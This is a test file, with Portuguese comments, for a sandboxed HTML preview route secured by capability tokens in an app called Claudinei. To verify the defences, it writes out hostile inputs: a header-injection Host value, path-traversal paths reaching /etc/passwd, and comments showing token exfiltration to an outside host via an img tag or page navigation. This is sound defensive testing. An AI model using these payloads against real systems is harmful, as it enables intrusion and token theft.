import { describe, it, expect, beforeEach } from 'vitest'
import { buildApp } from '../src/app.js'
import { openDb, type Db } from '../src/db.js'
import { loadConfig } from '../src/config.js'
import { createSessionManager } from '../src/claude/manager.js'
import { createAuthService, type AuthService } from '../src/auth/index.js'
import { createProjectsService } from '../src/projects.js'
import { createPreviewStore, pathFromPreviewUrl, previewUrl } from '../src/files/preview.js'
import { mkdtempSync, mkdirSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'

/**
 * Renderizar o HTML de um projeto — "ver como a página ficou", e não só o fonte.
 *
 * O problema não é exibir: é que uma página real puxa CSS, imagens e scripts por
 * caminho RELATIVO, e quem resolve caminho relativo é a URL do documento. A rota
 * `/api/files/content?path=…` não serve para isso: a partir dela, `../fotos/x.png`
 * vira `/api/files/fotos/x.png`. Daí a URL de preview espelhar a hierarquia real
 * do disco — aí o próprio navegador resolve os relativos, sem reescrever o HTML.
 *
 * E o preview NÃO pode carregar cookie: ele roda num iframe `sandbox` sem
 * `allow-same-origin` (obrigatório — sem isso, um HTML com script rodaria na
 * origem do Claudinei, com a sessão do operador, contra uma API que executa
 * comandos). Origem opaca não manda cookie nos subrecursos; por isso a permissão
 * viaja no PRÓPRIO caminho, como um token de capacidade: curto, confinado a uma
 * raiz e só de leitura.
 */

let app: Awaited<ReturnType<typeof buildApp>>
let projectId: number
let projectPath: string

const HTML = '<!doctype html><title>Oi</title><img src="../fotos/p.png"><script>document.title="x"</script>'
const PNG = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a])

beforeEach(async () => {
  const db = openDb(':memory:')
  const manager = createSessionManager({ db, broadcast: () => {} })
  app = await buildApp({ config: loadConfig({}), db, manager })
  projectPath = mkdtempSync(join(tmpdir(), 'files-preview-'))
  mkdirSync(join(projectPath, 'review'))
  mkdirSync(join(projectPath, 'fotos'))
  writeFileSync(join(projectPath, 'review', 'index.html'), HTML)
  writeFileSync(join(projectPath, 'review', 'estilo.css'), 'body{color:red}')
  writeFileSync(join(projectPath, 'fotos', 'p.png'), PNG)
  writeFileSync(join(projectPath, 'notas.txt'), 'não é página')
  writeFileSync(join(projectPath, 'review', 'com espaço & cia.html'), HTML)
  projectId = createProjectsService(db).create({ name: 'P', path: projectPath }).id
})

const emitir = async (path: string, extra?: Record<string, unknown>) =>
  app.inject({ method: 'POST', url: '/api/files/preview', payload: { path, projectId, ...extra } })

const urlDe = async (path = 'review/index.html'): Promise<string> => {
  const res = await emitir(path)
  expect(res.statusCode, res.body).toBe(200)
  return res.json().url as string
}

describe('emissão do preview (POST /api/files/preview)', () => {
  it('devolve uma URL que espelha o caminho real do arquivo', async () => {
    const url = await urlDe()
    expect(url).toContain('/api/files/preview/')
    // O trecho final é o caminho no disco: é ele que faz `../fotos/p.png` cair
    // no lugar certo quando o navegador resolver o relativo.
    expect(url.endsWith('/review/index.html'), url).toBe(true)
  })

  it('cada emissão traz um token diferente (não é um segredo reutilizável)', async () => {
    expect(await urlDe()).not.toBe(await urlDe())
  })

  it('só HTML: o resto do preview não faria sentido e ampliaria a rota pública', async () => {
    expect((await emitir('notas.txt')).statusCode).toBe(415)
  })

  it('arquivo inexistente → 404', async () => {
    expect((await emitir('review/fantasma.html')).statusCode).toBe(404)
  })

  /** A URL é montada com encode e lida de volta pelo router, que decodifica:
   *  um nome com espaço ou & tem de sobreviver à volta inteira, não só ao encode. */
  it('nome com espaço e & abre pela URL emitida', async () => {
    const res = await app.inject({ method: 'GET', url: await urlDe('review/com espaço & cia.html') })
    expect(res.statusCode, res.body).toBe(200)
    expect(res.body).toContain('<title>Oi</title>')
  })
})

describe('leitura pelo preview (GET)', () => {
  it('serve o HTML como documento, e não como texto puro', async () => {
    const res = await app.inject({ method: 'GET', url: await urlDe() })
    expect(res.statusCode).toBe(200)
    expect(res.headers['content-type']).toContain('text/html')
    expect(res.body).toContain('<title>Oi</title>')
  })

  /**
   * O ponto inteiro da feature: um caminho relativo que SOBE de diretório
   * (`../fotos/p.png`, o caso da galeria) tem de chegar no arquivo certo.
   */
  it('recurso relativo que sobe de diretório carrega, com o tipo certo', async () => {
    const base = (await urlDe()).replace(/\/review\/index\.html$/, '')
    const res = await app.inject({ method: 'GET', url: `${base}/fotos/p.png` })
    expect(res.statusCode).toBe(200)
    expect(res.headers['content-type']).toBe('image/png')
  })

  it('CSS irmão também carrega', async () => {
    const url = (await urlDe()).replace(/index\.html$/, 'estilo.css')
    const res = await app.inject({ method: 'GET', url })
    expect(res.statusCode).toBe(200)
    expect(res.headers['content-type']).toContain('text/css')
  })

  /**
   * `sandbox` sem `allow-same-origin` é o que impede o HTML de alcançar a sessão
   * do Claudinei — vale mesmo se alguém abrir a URL direto numa aba, onde o
   * atributo do iframe não existe. `allow-scripts` fica: uma página estática de
   * verdade (a galeria do operador monta os `src` por script) precisa dele, e sem
   * same-origin o script continua preso numa origem opaca.
   */
  it('documento sai sempre em sandbox, com script mas sem same-origin', async () => {
    const res = await app.inject({ method: 'GET', url: await urlDe() })
    const csp = res.headers['content-security-policy'] as string
    expect(csp).toContain('sandbox')
    expect(csp).toContain('allow-scripts')
    expect(csp, 'allow-same-origin devolveria a sessão do app ao HTML').not.toContain('allow-same-origin')
  })

  /**
   * O token vive na URL — e a URL é legível por qualquer script da própria
   * página (`location.href`). Então não basta bloquear `fetch`: uma tag
   * `<img src="https://alheio/?t=…">` levaria a capacidade embora, calada, e
   * quem a recebesse teria leitura do projeto até ela expirar.
   *
   * Por isso TODO subrecurso fica preso à origem que serviu a página. O custo é
   * consciente: uma página que puxa Tailwind/fontes de CDN aparece sem eles.
   * Entre renderizar bonito e não vazar uma chave de leitura, é o segundo.
   */
  it('subrecurso só da própria origem — nada sai para host alheio', async () => {
    const res = await app.inject({
      method: 'GET', url: await urlDe(), headers: { host: 'claudinei.local:9105' },
    })
    const csp = res.headers['content-security-policy'] as string
    for (const d of ['default-src', 'img-src', 'script-src', 'style-src', 'font-src', 'media-src']) {
      expect(csp, `${d} sem trava de origem`).toMatch(new RegExp(`${d}[^;]*claudinei\\.local:9105`))
    }
    expect(csp).toContain("connect-src 'none'")
    // <base href="https://alheio/"> reapontaria todo caminho relativo para fora.
    expect(csp).toContain("base-uri 'none'")
  })

  /** O Host vem do cliente: um `;` nele reescreveria a política inteira. */
  it('Host esquisito não injeta diretiva — fecha em vez de confiar', async () => {
    const res = await app.inject({
      method: 'GET', url: await urlDe(), headers: { host: "x; script-src 'unsafe-inline' *" },
    })
    const csp = res.headers['content-security-policy'] as string
    expect(csp).toContain("default-src 'none'")
    expect(csp).not.toContain('script-src *')
  })

  /** O app inteiro responde `X-Frame-Options: DENY` — se valesse aqui, o iframe
   *  do próprio visualizador não abriria. A exceção é só desta rota. */
  it('pode ser embutido pelo visualizador (e só por ele)', async () => {
    const res = await app.inject({ method: 'GET', url: await urlDe() })
    expect(res.headers['x-frame-options']).toBe('SAMEORIGIN')
  })
})

describe('limites do token de capacidade', () => {
  it('token desconhecido → 404', async () => {
    const url = (await urlDe()).replace(/preview\/[^/]+/, 'preview/naoexiste')
    expect((await app.inject({ method: 'GET', url })).statusCode).toBe(404)
  })

  it('não sai da raiz concedida, nem com ..', async () => {
    const base = (await urlDe()).replace(/\/review\/index\.html$/, '')
    const fora = join(tmpdir(), 'files-preview-alheio.txt')
    writeFileSync(fora, 'segredo')
    for (const alvo of [`${base}/..${fora}`, `/api/files/preview/${base.split('/')[4]}/fs${fora}`]) {
      expect((await app.inject({ method: 'GET', url: alvo })).statusCode, alvo).toBe(404)
    }
  })

  it('diretório não é servido', async () => {
    const url = (await urlDe()).replace(/\/index\.html$/, '')
    expect((await app.inject({ method: 'GET', url })).statusCode).toBe(404)
  })

  /**
   * O que a CSP não alcança: nenhuma diretiva impede a própria página de se
   * NAVEGAR para fora (`location = 'https://alheio/?t=' + location.href`) — a
   * antiga `navigate-to` foi abandonada pelos navegadores. É ruidoso (o quadro
   * sai do ar), mas levaria o token. Prendendo a concessão a quem a pediu, o
   * token vazado não serve para mais ninguém.
   */
  it('token não vale de outro endereço', async () => {
    const url = await urlDe()
    expect((await app.inject({ method: 'GET', url, remoteAddress: '127.0.0.1' })).statusCode).toBe(200)
    expect((await app.inject({ method: 'GET', url, remoteAddress: '10.9.9.9' })).statusCode).toBe(404)
  })

  it('expira: passado o prazo, a URL morre', () => {
    let agora = 1_000
    const store = createPreviewStore({ ttlMs: 60_000, now: () => agora })
    const token = store.issue('/raiz')
    expect(store.resolve(token)).toMatchObject({ root: '/raiz' })
    agora += 60_001
    expect(store.resolve(token), 'token vencido ainda valia').toBeNull()
  })

  /** Concessões velhas não podem se acumular na memória do processo. */
  it('não cresce sem limite', () => {
    let agora = 0
    const store = createPreviewStore({ ttlMs: 10, now: () => agora })
    const antigo = store.issue('/a')
    agora = 11
    for (let i = 0; i < 5; i++) store.issue(`/b${i}`)
    expect(store.resolve(antigo)).toBeNull()
    expect(store.size()).toBeLessThanOrEqual(5)
  })
})

describe('a URL de preview e o caminho do disco', () => {
  it('ida e volta preserva o caminho (inclusive com espaço)', () => {
    const url = previewUrl('tok', '/home/eu/meus docs/a.html')
    expect(url.startsWith('/api/files/preview/tok/')).toBe(true)
    const resto = decodeURIComponent(url.split('/api/files/preview/tok/')[1])
    expect(pathFromPreviewUrl(resto)).toBe('/home/eu/meus docs/a.html')
  })

  it('caminho do Windows sobrevive à ida e volta', () => {
    const url = previewUrl('tok', 'C:\\Users\\eu\\site\\a.html')
    const resto = decodeURIComponent(url.split('/api/files/preview/tok/')[1])
    expect(pathFromPreviewUrl(resto)).toBe('C:/Users/eu/site/a.html')
  })

  it('recusa `..` e caminho vazio em vez de normalizar calado', () => {
    expect(pathFromPreviewUrl('fs/home/../etc/passwd')).toBeNull()
    expect(pathFromPreviewUrl('')).toBeNull()
  })
})

/**
 * A rota GET é alcançável SEM cookie de sessão — é o que permite ao iframe
 * sandbox (origem opaca) buscar imagens e CSS. Quem autoriza é o token.
 * Emitir o token, esse sim, continua exigindo login.
 */
describe('com autenticação ligada', () => {
  let comAuth: Awaited<ReturnType<typeof buildApp>>
  let auth: AuthService
  let db: Db
  let pid: number

  beforeEach(async () => {
    db = openDb(':memory:')
    auth = createAuthService({ db })
    auth.users.create({ username: 'root', password: 'abcd1234', isAdmin: true })
    comAuth = await buildApp({
      config: loadConfig({}), db, auth,
      manager: createSessionManager({ db, broadcast: () => {} }),
    })
    pid = createProjectsService(db).create({ name: 'P', path: projectPath }).id
  })

  const login = async (): Promise<string> => {
    const res = await comAuth.inject({
      method: 'POST', url: '/api/auth/login', remoteAddress: '127.0.0.1',
      payload: { username: 'root', password: 'abcd1234' },
    })
    return (res.cookies as { name: string; value: string }[]).find((c) => c.name === 'claudinei_token')!.value
  }

  /** A brecha que a liberação poderia abrir: ela vale só para a leitura do
   *  preview — o resto de /api/files continua atrás da sessão. */
  it('a liberação não escapa para as outras rotas de arquivo', async () => {
    const res = await comAuth.inject({
      method: 'GET', remoteAddress: '127.0.0.1',
      url: `/api/files/content?path=${encodeURIComponent('review/index.html')}&projectId=${pid}`,
    })
    expect(res.statusCode).toBe(401)
  })

  it('emitir exige login; ler com o token não', async () => {
    const semLogin = await comAuth.inject({
      method: 'POST', url: '/api/files/preview', remoteAddress: '127.0.0.1',
      payload: { path: 'review/index.html', projectId: pid },
    })
    expect(semLogin.statusCode).toBe(401)

    const token = await login()
    const emitido = await comAuth.inject({
      method: 'POST', url: '/api/files/preview', remoteAddress: '127.0.0.1',
      cookies: { claudinei_token: token },
      payload: { path: 'review/index.html', projectId: pid },
    })
    expect(emitido.statusCode).toBe(200)

    const semCookie = await comAuth.inject({ method: 'GET', url: emitido.json().url, remoteAddress: '127.0.0.1' })
    expect(semCookie.statusCode, 'o iframe sandbox não manda cookie — se exigir, nada carrega').toBe(200)
  })
})
